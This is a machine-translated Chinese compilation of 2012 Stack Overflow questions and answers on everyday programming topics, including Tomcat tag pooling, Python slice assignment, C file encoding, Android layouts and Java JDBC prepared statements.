因此，在 Tomcat 中，由于我们的 jsp 自定义标记具有一些可选属性，因此标记的后续调用将重用在先前调用中分配的值。在 Weblogic 中，每次出现时都会调用标签的构造函数，因此对于 jsp 页面中标签的每次出现，标签都会被初始化为默认值。

有谁知道每次在 jsp 页面上遇到 jsp 自定义标签时告诉 Tomcat 实例化一个新的 Tag 对象的方法（通过 tomcat 配置文件条目、web.xml 条目等）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:57:17.420

servlet 容器可能会也可能不会池化标记实例（根据 Java Servlet 规范）。解决问题的最佳方法应该是修复标签的编写方式。在您的情况下，可能会在`doEndTag()`方法中进行清理（将可选参数设置为 null）。

如果这不可行，您可以通过将其放入 Tomcat 安装中来禁用 Tomcat 中的标签池`conf/web.xml`：

```
 <servlet>
        <servlet-name>jsp</servlet-name>
        <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
        (...)
        <init-param>
            <param-name>enablePooling</param-name>
            <param-value>false</param-value>
        </init-param>
        (...)
 </servlet> 
```

# python - x = myList[:] vs myList[:] = x 中冒号运算符的行为

> ID：12078679
> 
> 赞同：3
> 
> 时间：2012-08-22T17:48:40.313
> 
> 标签：python, list-comprehension, slice

> **可能重复：**
> [切片整个列表的切片赋值和直接赋值有什么区别？](https://stackoverflow.com/questions/10155951/what-is-the-difference-between-slice-assignment-that-slices-the-whole-list-and-d)

我没有钱上学，所以我一边在高速公路上的收费站轮班工作，一边自学一些 Python（长时间的夜晚，几乎没有顾客）。（顺便说一句：Coursera 应该翻译成所有语言......）

我在这里读过，如果我有一个清单`l`：

```
l = ['a', '', 'b'] 
```

我想像这样过滤掉空字符串：

```
l = [c for c in l if c] 
```

或者像这样：

```
l = filter(lambda x: x, l) 
```

建议改为这样做：

```
l[:] = ... # either method 1 or method 2 above 
```

不要“丢失”对 first 的引用`l`，尤其是在其他变量指向它的情况下。

我的问题：

*   为什么在这种情况下`l[:]`表示“的内容`l`”，允许专门重新分配给“相同” `l`，而在其他地方我认为它是“相同大小的切片”，方便地为我*创建 l 的副本*？

*   我是否*误解*了如何完全使用`l[:]`相同列表重新分配？

我想如果我有一个`l`并且我要求一个`l[:]`，后者是原件的实际副本`l`？

参考：《学习Python》->*复制列表有多种方法，包括使用内置列表功能和标准库复制模块。也许最常见的方法是从头到尾切片*

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:50:59.417

在 Python 中，获取列表的一部分和设置列表的一部分是有区别的。事实上，它们实际上是独立的操作（`__getitem__`和`__setitem__`，分别）。所以，对于 get 的情况来说，对于 set 来说可能是不正确的。

在前一种情况下，`l[:]`意味着获取列表的副本（它会生成一个全新的列表，其内容与旧列表的所有内容相同）。在后一种情况下，`l[:] = ...`意味着将列表的内容设置为其他内容。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:56:48.033

因为 LHS 切片运算符基本上是说*通过这个列表枚举并为每个索引分配一些东西*，而 RHS 运算符说*通过这个列表枚举，并使用这些值创建一个新对象*。

所以让我们看看它的实际效果：

## LHS

```
l[:] = [c for c in l if c!=0]  #ignore how stupid this list comprehension is 
```

基本上分为：

```
l[0] = l[0] if l[0] != 0
l[1] = l[1] if l[1] != 0
...
l[n] = l[n] if l[n] != 0 
```

因此，因为您正在枚举它并分配值，所以您没有创建任何新对象——只是为 l 的索引赋予新值。

但是，另一方面，做

```
l = anything 
```

更改变量`l`持有的引用。之后，它指向内存中完全不同的对象。

## RHS

现在，

```
c = l[:] 
```

会给你一份`l`，而不是参考`l`。这必须是真的，否则，

```
c = l[1:5] 
```

`l`如果要尝试使用与 . 相同的对象引用，则必须更改`l`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T17:50:53.217

在赋值左侧使用切片运算符时，您是在告诉 python 将右侧的序列存储在列表的选定元素中。

换句话说，您不是在替换`l`，而是在分配*给* `l`.

# c - C读取csv文件

> ID：12078689
> 
> 赞同：1
> 
> 时间：2012-08-22T17:49:35.253
> 
> 标签：c, parsing, csv

我遇到了一个我以前从未遇到过的问题并且感到困惑......由于某种原因，当我尝试按字符读取CSV文件时，但似乎空格以某种方式放置在那里......更奇怪的是任何地方都不存在空格字符的事实。我举个例子...

```
char *readgd(const char *fname)
{
    char *gddata, *tmp;
    FILE *fp;
    int buff = 1024, c = 0, ch;

    if(!(fp = fopen(fname, "r")))
    {
        printf("\nError! Could not open %s!", fname);
        return 0x00;
    }
    if(!(gddata = malloc(buff)))
    {
        fclose(fp);
        printf("\nError! Memory allocation failed!");
        return 0x00;
    }
    while(ch != EOF)
    {
        c++;
        ch = fgetc(fp);
        if(buff <= c)
        {
            buff += buff;
            if(!(tmp = realloc(gddata, buff)))
            {
                free(gddata);
                fclose(fp);
                printf("\nError! Memory allocation failed!");
            }
            gddata = tmp;
        }
        gddata[c - 1] = ch;
        if(gddata[c - 1] != ' ') printf("%c", gddata[c - 1]); //no spaces?
    }
    if(!(tmp = realloc(gddata, c + 1)))
    {
        free(gddata);
        fclose(fp);
        printf("\nError! Memory allocation failed!");
    }
    gddata = tmp;
    gddata[c] = 0x00;
    fclose(fp);

    return gddata;
} 
```

使用以下 CSV 片段：

```
:Tagname,Area,SecurityGroup,Container,ContainedName,ShortDesc,ExecutionRelativeOrder,ExecutionRelatedObject,UDAs,Extensions,CmdData,Address_ACbHAlmCfg,Address_ACbHWarnCfg,Address_ACbLAlmCfg,Address_ACbLWarnCfg,Address_ACbTfCfg,Address_ACrHAlmDb,Address_ACrHAlmSp,Address_ACrHAlmTmrSp,Address_ACrHWarnDb,Address_ACrHWarnSp,Address_ACrHWarnTmrSp,Address_ACrLAlmDb,Address_ACrLAlmSp,Address_ACrLAlmTmrSp,Address_ACrLWarnDb,Address_ACrLWarnSp,Address_ACrLWarnTmrSp,Address_ACrTfTmrSp,Address_bHalm,Address_bHWarn,Address_bLAlm,Address_bLwarn,Address_bMode,Address_bTfAlm,Address_rCCmd,Address_rVal, 
```

将其输出到控制台：

```
■: T a g n a m e , A r e a , S e c u r i t y G r o u p , C o n t a i n e r , C
    o n t a i n e d N a m e , S h o r t D e s c , E x e c u t i o n R e l a t i v e
    O r d e r , E x e c u t i o n R e l a t e d O b j e c t , U D A s , E x t e n s
    i o n s , C m d D a t a , A d d r e s s _ A C b H A l m C f g , A d d r e s s _
    A C b H W a r n C f g , A d d r e s s _ A C b L A l m C f g , A d d r e s s _ A
    C b L W a r n C f g , A d d r e s s _ A C b T f C f g , A d d r e s s _ A C r H
    A l m D b , A d d r e s s _ A C r H A l m S p , A d d r e s s _ A C r H A l m T
    m r S p , A d d r e s s _ A C r H W a r n D b , A d d r e s s _ A C r H W a r n
    S p , A d d r e s s _ A C r H W a r n T m r S p , A d d r e s s _ A C r L A l m
    D b , A d d r e s s _ A C r L A l m S p , A d d r e s s _ A C r L A l m T m r S
    p , A d d r e s s _ A C r L W a r n D b , A d d r e s s _ A C r L W a r n S p ,
    A d d r e s s _ A C r L W a r n T m r S p , A d d r e s s _ A C r T f T m r S p
    , A d d r e s s _ b H a l m , A d d r e s s _ b H W a r n , A d d r e s s _ b L
    A l m , A d d r e s s _ b L w a r n , A d d r e s s _ b M o d e , A d d r e s s
    _ b T f A l m , A d d r e s s _ r C C m d , A d d r e s s _ r V a l , 
```

我很困惑这些空间是从哪里来的。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:53:16.853

您确定 CSV 未使用 UTF-16 编码（每个字符使用两个字节）吗？

这是您在其他有效 ASCII 字符之间看到空格的最可能原因，因此请先尝试验证编码。

# c# - C# Excel 互操作计数和替换

> ID：12078696
> 
> 赞同：3
> 
> 时间：2012-08-22T17:50:12.750
> 
> 标签：c#, excel

我有一些代码来替换 excel 项目中的文本（发布在下面），这段代码就像一个魅力。但我也希望替换文本实例的数量。有没有办法得到它？

```
static void ReplaceTextInExcelFile(string filename, string replace, string replacement)
{
object m = Type.Missing;

// open excel.
Application app = new ApplicationClass();

// open the workbook. 
Workbook wb = app.Workbooks.Open(
    filename,
    m, false, m, m, m, m, m, m, m, m, m, m, m, m);

// get the active worksheet. (Replace this if you need to.) 
Worksheet ws = (Worksheet)wb.ActiveSheet;

// get the used range. 
Range r = (Range)ws.UsedRange;

// call the replace method to replace instances. 
bool success = (bool)r.Replace(
    replace,
    replacement,
    XlLookAt.xlWhole,
    XlSearchOrder.xlByRows,
    true, m, m, m);

// save and close. 
wb.Save();
app.Quit();
app = null;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:30:05.470

您不能直接执行此操作，但您可以运行`Find`并`FindNext`运行，然后替换在搜索中找到的任何内容。这将为计算替换计数打开一个范围。

```
Range r = (Range)ws.UsedRange;
int count=0;

Range first=r.Find(replace,m,m,XlLookAt.xlWhole,XlSearchOrder.xlByRows,m,m,m,m);
if(first!=null)
{count++;
Range start=first;
do
{
  start.Value=replacement;
  count++;
  start=r.FindNext(m);
}
while(start!=first);

//do whatever with count 
```

# ruby - 需要'init'LoadError：没有要加载的文件--init

> ID：12078697
> 
> 赞同：0
> 
> 时间：2012-08-22T17:50:15.157
> 
> 标签：ruby, irb

好久没碰过Ruby了，这让我很困惑。

启动了irb。然后我跑的第一行是：

```
require 'init' 
```

我得到了这个：

```
LoadError: no such file to load -- init 
```

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:09:49.183

错误消息说得很清楚：

```
no such file to load -- init 
```

因此，要么没有这样的文件（`init.rb`、`init.so`、`init.jar`、`init.rba`等，具体取决于您使用的 Ruby 的具体实现），要么文件不在`$LOAD_PATH`.

# c# - 如何在 Windows 窗体中创建具有精确字符高度的字体？

> ID：12078700
> 
> 赞同：2
> 
> 时间：2012-08-22T17:50:33.523
> 
> 标签：c#, winforms, fonts, font-size

在我的程序中，我需要生成一个位图，其中所有数字字符（0..9）从左到右排列，加上一些其他字符。

用户将从 UI 中选择：

1.  所需的字体，和
2.  所需的字符高度（以像素为单位）。

所以我想创建一个位图，然后从这个位图中创建一个图形，然后将数字一个一个地绘制到这个位图中，然后将它保存到磁盘。

我在几个小时内无法弄清楚：如何创建具有正确大小的字体，以便数字“0”具有用户给定的高度？

我使用了 Font 构造函数中的所有参数，使用 StringFormat 的属性，使用 MeasureString/MeasureText/MeasureCharacterRanges，我尝试通过 P/Invoke（具有正/负 nHeight）使用本机 CreateFont() 创建字体。所有称为“大小”或“高度”的参数似乎都表示某个比“0”大得多的假设字符的大小。

我确实阅读了关于线高、em 高度、上升、下降等的理论。似乎没有关于角色*真实*高度的概念，没有填充和间距等

我的问题又是：给定“0”字形的字体名称和所需的像素高度，我如何创建一种字体来绘制具有所需高度的字形？

我将不胜感激任何指导。

稍后编辑关于我的项目的更多细节：它是一个带有大显示屏的嵌入式设备，我需要为设计人员提供一种简单的方法来生成和尝试他们喜欢的位图字体。生成此类位图字体的 Windows 工具对我来说似乎是一个很好的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-05T11:56:45.247

虽然我之前发布的内容与我之前发布的内容相差不远，但它实际上并没有奏效。在对此进行猛烈抨击时，我发现有趣的是，graphics.MeasureString("M", ...) 报告的高度远大于 graphics.MeasureString("MM", ...)。在手动计算字体大小时，我发现第一个（与 GetEMSize 的响应相关）实际上是全线大小。最后，我意识到数字的实际字符大小不需要与任何指标相关，无论是真实的还是.net。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:03:13.897

我相信您可以使用此[字体构造函数](http://msdn.microsoft.com/en-us/library/c8dy0032.aspx)将[GraphicsUnit](http://msdn.microsoft.com/en-us/library/system.drawing.graphicsunit.aspx)指定为像素。然后它应该创建具有适当大小的字体。

添加测试代码 - 根据您的情况进行相应编辑，不要判断样式，我只是想要一些可以粘贴到 LINQPad 中并生成图像的东西。

```
using (var font = new Font("Arial",10,FontStyle.Regular, GraphicsUnit.Pixel))
using (var image = new Bitmap(30, 15))
using (var graphics = Graphics.FromImage(image))
{
    graphics.FillRectangle(Brushes.White, new Rectangle(0, 0, 30, 15));
    graphics.DrawString("Ay", font, Brushes.Black, 0, 0);
    image.Save(@"E:\test.bmp", ImageFormat.Bmp);
} 
```

请记住，在按像素设置大小时，字体中的所有字符都需要适合该范围，这意味着字母带有下降线和字母带有上升线。

# c# - 先建立列表，还是查询每条记录？（必须检查重复）

> ID：12078704
> 
> 赞同：0
> 
> 时间：2012-08-22T17:50:43.267
> 
> 标签：c#, sql, sql-server, web-scraping

我正在做一些网络抓取来建立一个个人 SQL 数据库。当我循环浏览网络请求时，我正在添加记录。唯一的问题是，Web 请求中有时会出现重复项，我想确保只添加一条记录，如果它不存在于我的数据库中。我认为这可以通过在每次插入之前执行 SQL 查询来完成，以确保尚未添加记录，但这是最好的方法吗？首先建立一个 Generic.List，然后在最后插入我的所有数据库是否更有意义？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:55:52.333

似乎您需要主键或对将行标识为重复的列的唯一约束。然后，如果插入中存在违反唯一约束的错误，则该行将不会插入。捕获异常，将其记录到不同的表中以供将来验证并移至下一行。 [http://www.w3schools.com/sql/sql_unique.asp](http://www.w3schools.com/sql/sql_unique.asp)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:07:44.713

您可以创建一个存储过程，该过程将尝试更新记录，然后在更新查询未更新任何行时插入。这将最大限度地减少需要运行的查询数量并防止检查行的存在。一点点谷歌搜索发现[了这个](http://vadivel.blogspot.com/2011/09/upsert-insert-and-update-in-sql-server.html)。第二个选项看起来可能是您正在寻找的。

```
/*
Same SP is used to INSERT as well as UPDATE a table.
Here we are avoid unnecessary checking of whether the record exists or not.
Instead try to Update directly. If there is no record then @@RowCount would be 0.
Based on that Insert it as a new record.
*/
CREATE PROCEDURE uspUPSert_Ver2
(
    @empID INT,
    @fname VARCHAR(25),
    @lname VARCHAR(25),
    @emailid VARCHAR(50)
)
AS
BEGIN
    SET NOCOUNT ON
    BEGIN TRAN
        UPDATE tblUpsert WITH (SERIALIZABLE)
            SET emailid = @emailid ,
                firstname = @fname ,
                lastname = @lname
        WHERE EmpID = @empID

        IF @@ROWCOUNT = 0
        BEGIN
            INSERT INTO tblUpsert VALUES (@empID, @fname, @lname, @emailid)
        END
    COMMIT TRAN
END
GO 
```

# xml - 如何使用 vb.net 将 XML 中的数据读取到结构中

> ID：12078711
> 
> 赞同：1
> 
> 时间：2012-08-22T17:51:00.070
> 
> 标签：xml, vb.net

我有一个如下所示的 XML 文件：

```
<work>   
    <name>Clean door</name>
    <time>10h today</time>
</work>
<work>
    <name> Clean floor </name>
    <time>12h today</time>
</work> 
```

文档中有更多`work`元素，这只是一个示例。我在 VB.net 中定义了一个结构，如下所示：

```
Structure work
    Dim name As String
    Dim time As String
End Structure 
```

如何`work`从 XML 中读取所有元素并将它们存储`work`在 VB.NET 中的对象列表中？例如：

```
work(1).name = "Clean Door"
work(1).time = "10h today" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:55:20.240

您可以使用[`XmlSerializer`](http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmlserializer.aspx)或 将[`DataContractSerializer`](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datacontractserializer.aspx)文件反序列化为对象模型。

您需要使用适当的属性装饰对象模型，以确保序列化按预期工作。

# android - 动态添加视图到混合 xml/代码复合布局

> ID：12078714
> 
> 赞同：3
> 
> 时间：2012-08-22T17:51:33.657
> 
> 标签：android, android-layout

对不起，如果这与膨胀的大量问题/答案是多余的，但我无法解决我的问题。

我有一个复合视图（LinearLayout），它有一个用 XML 定义的固定部分和代码中的附加功能。我想动态地添加视图。

这是 XML 部分（compound.xml）：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/compoundView"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" >
    <TextView android:id="@+id/myTextView" 
        android:layout_width="110dp" 
        android:layout_height="wrap_content"
        android:text="000"  />
</LinearLayout> 
```

我在代码中定义了一个 LinearLayout 来引用 XML：

```
public class CompoundControlClass extends LinearLayout {
    public CompoundControlClass (Context context) {
        super(context);
        LayoutInflater li;
        li = (LayoutInflater)getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        li.inflate(R.layout.compound_xml,*ROOT*, *ATTACH*);
    }
    public void addAView(){
        Button dynBut = new Button();
        // buttoin def+layout info stripped for brevity
        addView(dynBut);
    }
} 
```

我尝试使用 addAView 以编程方式添加视图。

如果 ROOT 为 null 且 ATTACH 为 false，我有以下层次结构（每个 HierarchyViewer）：

*   CompoundControlClass>dynBut

XML 中的原始 TextView 消失了。

如果 ROOT 是这个并且 ATTACH 是真的，我有以下层次结构：

*   CompoundControlClass>compoundView>myTextView
*   CompoundControlClass>dynBut

我想拥有

*   CompoundControlClass>myTextView
*   CompoundControlClass>dynBut

基本上代码和 XML 只是一个独特的视图。我严重错过了什么？

# 答案基于 D Yao 的反馈 ----------

诀窍是在主布局中包含复合组件，而不是直接引用它。

activity_main.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <include layout="@layout/comound"
        android:id="@+id/compoundView"
        android:layout_alignParentBottom="true"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"/>
</RelativeLayout> 
```

mainActivity.java

```
public class MainActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        CompoundControlClass c = (CompoundControlClass) this.findViewById(R.id.compoundView);
        c.addAView(this);
    }  
} 
```

复合控制类.java

```
public class CompoundControlClass extends LinearLayout {
    public CompoundControlClass(Context context) {
        super(context);
    }
    public CompoundControlClass(Context context, AttributeSet attrs) {
        super(context, attrs);
    }
    public CompoundControlClass(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    public void addAView(Context context){
         ImageView iv = new ImageView(context);                    
         iv.setImageResource(R.drawable.airhorn);
         addView(iv);
    }
} 
```

复合.xml

```
<com.sounddisplaymodule.CompoundControlClass    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/compoundView"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" > 
    <TextView
        android:layout_width="110dp" 
        android:layout_height="wrap_content"
        android:gravity="right"
        android:textSize="40sp"
        android:textStyle="bold"
        android:text="0:00"  />     
</com.sounddisplaymodule.CompoundControlClass> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:38:28.780

为什么不在线性布局上调用 addView 呢？根据您列出的需求，我认为不需要 CompoundControlClass。

```
LinearLayout v = (LinearLayout)findViewById(R.id.compoundView);
v.addView(dynBut); 
```

在这种情况下，v 将包含 myTextView，然后是 dynBut。

如果您希望添加其他功能并因此真的需要创建复合控件类，只需将构造函数保留为 super(etc) 并删除其余部分

然后你的 xml 看起来像这样：

```
<com.yourpackage.CompoundControlClass xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/compoundView"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" >
    <TextView android:id="@+id/myTextView" 
        android:layout_width="110dp" 
        android:layout_height="wrap_content"
        android:text="000"  />
</com.yourpackage.CompoundControlClass> 
```

您还必须确保您的 CompoundControlClass.java 包含适当的构造函数，该构造函数同时接受 Context 和属性集。

然后，在您的 java 中，调用 setContentView 后，您可以执行以下操作：

```
CompoundControlClass c = (CompoundControlClass)findViewById(R.id.compoundView);
Button b = new Button(context);
//setup b here or inflate your button with inflater
c.addView(b); 
```

这会给你你想要的层次结构。

# sharepoint - 从当前站点获取列表项

> ID：12078724
> 
> 赞同：0
> 
> 时间：2012-08-22T17:52:08.790
> 
> 标签：sharepoint, sharepoint-2010

我正在尝试创建一个页面布局，它应该有一个查找字段。查找字段应始终填充列表项。

此列表将存在于所有子站点中，因此无论我在何处创建此页面，列表都应填充当前站点的列表项。

我尝试使用站点列查找字段，但它始终指向顶部站点下的列表，而不是当前站点。

关于如何使其工作或更好的替代方案的任何建议？谢谢！

让我知道我是否可以提供更多信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T05:58:12.153

我能想到的最直接的解决方案是使用跨站点查找列并为每个子站点创建单独的字段。但是，您需要为每个子站点创建和使用不同的页面布局。

您可以使用[http://sp2010filteredlookup.codeplex.com/](http://sp2010filteredlookup.codeplex.com/)进行跨站点查找。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-11-13T12:54:53.787

**解决方案 1** - 使用[http://sp2010filteredlookup.codeplex.com/](http://sp2010filteredlookup.codeplex.com/)

使用过滤的查找解决方案。因此，假设您有自定义页面布局和自定义页面内容类型。每次创建新子站点时，您应该记住转到页面列表设置并通过添加跨站点查找来编辑页面内容类型（使用相同的字段“内部名称”）。所以你仍然有一个页面布局（和一个内容类型）。但是对于每个 Pages 库实例，Content Type 包含差异字段（但具有相同的内部名称）。它将允许您运行 CAML 查询和其他需要的东西而不会出现任何问题。

**解决方案 2** - 开发自定义共享点字段类型。

在编辑模式下，控件将呈现“下拉列表”并从当前子站点上的列表实例填充数据。在字段设置中，您可以拥有相对列表 url。

**解决方案 3** - 隐藏文本字段/js 片段解决方案

页面内容类型可以包含隐藏文本字段（例如可以包含 json 格式的选定字段值）。开发将处理所有逻辑（在编辑/查看模式下呈现、保存等）的 js 片段并将其放在页面布局（aspx）上。

我建议使用解决方案#1 或#2。

# r - R检查两个列表中的排序顺序

> ID：12078727
> 
> 赞同：2
> 
> 时间：2012-08-22T17:52:17.543
> 
> 标签：r

事实证明这是一个挑战。我有三个向量 x、y 和 z

```
x = c('a','b','c','d','f','m','n')
y = c('b','c','f')
z = c('b','a','n') 
```

x 是我的超集。它指定元素 a、b、c... 等应出现的顺序。我想要做的是能够判断一个向量是否遵循与 x 相同的顺序。例如，y 与 x 具有相同的顺序。“b”在“c”之前，而“c”又在“f”之前。但是 z 出现故障，因为 'a' 出现在 'b' 之后。有没有快速的方法来检查这个？

提前非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:56:52.207

试试这个：

```
all(diff(match(y,x)) > 0)
[1] TRUE
all(diff(match(z,x)) > 0)
[1] FALSE 
```

`match`返回 中每个元素的数值位置`x`，然后我们只需检查该向量的值是否始终在增加。

# php - 更改机器名称后，codeigniter 解决方案不再在本地机器上工作

> ID：12078733
> 
> 赞同：0
> 
> 时间：2012-08-22T17:52:48.290
> 
> 标签：php, codeigniter, ubuntu

我有一个名为的网络应用程序：（出于本文的目的，我将“LH”替换为“localhost”）

```
 http://LH/myapp/index.php/welcome 
```

在我的 config.php 中，我曾经有：

```
 $config['base_url'] = http://LH/myapp/; 
```

但为了使它可以从我们网络上的其他机器访问，我将其更改为我的机器名称：

```
 $config['base_url'] = http://mymachinename/myapp/; 
```

我现在可以从其他机器上加载我的网站，除了盒子本身。我在 ubuntu 12.04 上运行。除了编辑我的 /etc/hostname 文件之外，我还需要做什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:57:54.323

从外观上看，您正在从 LAN 访问您的应用程序

这意味着，您的计算机正在使用 LAN IP。这是在您的路由器（即主网络路由器）上配置的。

在您的本地机器上，当您打开您的网站时，如果您通过 localhost (LH) 执行此操作，它可能无法正常工作，但是，打开您的`/etc/hosts`并使用您的机器名称**添加您的 LAN IP**，目前您的机器名称可能仅为 127.0.0.1。

希望能帮助到你。如果它没有发表评论:)

# python - Python，pygame.mixer：声音不起作用

> ID：12078739
> 
> 赞同：0
> 
> 时间：2012-08-22T17:53:29.663
> 
> 标签：python, audio, pygame, mixer

当我尝试运行以下代码时，我没有收到任何错误或任何声音。声音文件没有损坏，我也尝试了许多其他声音文件。

```
import pygame
pygame.mixer.init(44100, -16, 2, 2048)
sound = pygame.mixer.Sound("9001.wav")
sound.play() 
```

输出很简单：

```
<Channel object at 0x00000000021EF258> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T21:06:27.963

好的...在一遍又一遍地编辑我的文件后，我终于让它工作了。一旦我让它工作，我可以把我的代码改回以前的样子。我完全不知道如何修复。

# cocoa - 将 NSColorWell 的颜色内容绘制到 NSTextView

> ID：12078743
> 
> 赞同：0
> 
> 时间：2012-08-22T17:53:57.980
> 
> 标签：cocoa

再次感谢您的帮助 -

将 colorWell 中显示的颜色的 60x60 像素正方形表示插入 textView 的最佳方法是什么？我知道如何引用显示颜色的值。

再次。谢谢。

-保罗。

此操作使用 colorWell 作为发件人。当我将它添加到按钮初始化操作时它不起作用：

```
 NSColor *wellColor;

wellColor = [colorWell color];

   float
   red, green, blue;

   red = [wellColor redComponent];
   green = [wellColor greenComponent];
   blue = [wellColor blueComponent];

[colorWell setColor:wellColor];

[colorWell setColor:[NSColor colorWithCalibratedRed:red green:green blue:blue   alpha:1.0]];

wellColor = [colorWell color];
NSRect r = NSMakeRect(190, 130, 100, 100);
NSBezierPath *bp = [NSBezierPath bezierPathWithRect:r];
NSColor *color = wellColor;
[color set];
[bp fill]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:29:59.517

最简单的方法是使用 NSTextAttachment 并将其附加为图像（绘制纯色填充图像是一项简单的任务，您可以通过基本绘图文档了解）。否则，您将不得不对文本系统的部分进行子类化和自定义，以便为自己腾出空间并在那里绘制颜色。

# java - 使用 Java 将变量值插入 SQL Server

> ID：12078744
> 
> 赞同：7
> 
> 时间：2012-08-22T17:54:01.337
> 
> 标签：java

到目前为止，只有当我在 executeUpdate 语句中声明值时，我才能将数据插入到我的 SQL 表中。我想知道是否有一种方法可以将这些值作为变量传递，我将在执行方法中声明为参数，如下所示：

```
public void updateSQL(String name, String dnsName, String ipV4, String ipV6, int statusCode)
{
    try
    {
        Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        Connection connection = DriverManager.getConnection("jdbc:sqlserver://servername;database=databasename;integratedSecurity=true");

        System.out.println("Database Name: " + connection.getMetaData().getDatabaseProductName());

        Statement statement = connection.createStatement();

        statement.executeUpdate("INSERT INTO ComputerStatus(Name, DNSName, IPAddressV4, IPAddressV6, StatusCodeID)" + "VALUES(@Name, @DNSName, @IPAddressV4, @IPAddressV6, @StatusCodeID)");
        System.out.println("Data Inserted");

        ResultSet resultSet = statement.executeQuery("SELECT Name FROM ComputerStatus");

        while(resultSet.next())
        {
            System.out.println("Computer Name: " + resultSet.getString("Name"));
        }

        connection.close();
    }
    catch (Exception e)
    {
        e.printStackTrace();
        System.err.println("Problem Connecting!");
    }
} 
```

我已经尝试了几种不同的方法，但到目前为止还没有运气。有人知道这是否可以做到吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-22T17:56:08.540

您可以使用`PreparedStatement`代替`Statement`.

```
PreparedStatement stmt = connection.prepareStatement("insert into test (firstname, lastname) values (?, ?");
stmt.setString(1, name);
stmt.setString(2, lname);
stmt.executeUpdate(); 
```

使用这种方式，您可以防止 SQL 注入。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T18:02:07.390

看看这里：

```
PreparedStatement prep = conn.prepareStatement("INSERT INTO ComputerStatus(Name, DNSName, IPAddressV4, IPAddressV6, StatusCodeID) VALUES(?, ?, ?, ?, ?)");
prep.setString(1, name);
prep.setString(2, dnsName);
prep.setString(3, ipV4name);
prep.setString(4, ipV6);
prep.setInt(5, statusCode);
prep.executeUpdate(); 
```

[这](http://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html)将帮助您理解。

# java - Java 变量被覆盖的方法被覆盖的概念

> ID：12078751
> 
> 赞同：3
> 
> 时间：2012-08-22T17:54:51.803
> 
> 标签：java, variables, inheritance, overriding, shadowing

我正在努力理解 Java 继承的变量阴影方法覆盖概念。

情况1：

```
class Car{
   public int gearRatio = 8;
   public String accelerate() {  return "Accelerate : Car";  }
}
class SportsCar extends Car{
   public int gearRatio = 9;
   public String accelerate() {  return  "Accelerate : SportsCar";  }
   public static void main(String[] args){
      Car c = new SportsCar();
      System.out.println( c.gearRatio+"  "+c.accelerate() );
   }
} 
```

输出：8 加速：跑车。

案例二：

```
public class TestClass{
   public static void main(String args[ ] ){
      A o1 = new C( );
      B o2 = (B) o1;
      System.out.println(o1.m1( ) );
      System.out.println(o2.i );
   }
}
class A { int i = 10;  int m1( ) { return i; } }
class B extends A { int i = 20;  int m1() { return i; } }
class C extends B { int i = 30;  int m1() { return i; } } 
```

输出：30、20

因此，如果我理解正确，则始终调用超类变量，除非显式调用子类变量。但是对于调用子类重写方法的方法，情况正好相反，除非显式调用超类。

我认为变量和方法应该工作相同，或者在创建具有相同变量的子类时应该存在编译错误。

有人可以解释这是否正确以及为什么 java 会这样工作。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-22T17:59:09.290

> 我认为变量和方法应该工作相同，或者在创建具有相同变量的子类时应该存在编译错误。

好吧，这根本不是 Java 的工作方式。

变量*不是*多态处理的——没有“覆盖”变量的概念。然而，方法*是以*多态方式处理的。*行为*可以是特化的，但不是*状态*。

请注意，如果您的变量是私有的，因为它们几乎总是应该是私有的，那么情况甚至都不可见。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:58:05.670

在 java 中，没有`Instance variable overriding concept`变量，并且变量不是多态的方法。

所以在你的情况下，如果你使用：

```
Car c = new SportsCar();  // c is Object reference of type Car
System.out.println( c.gearRatio+"  "+c.accelerate() ); 
```

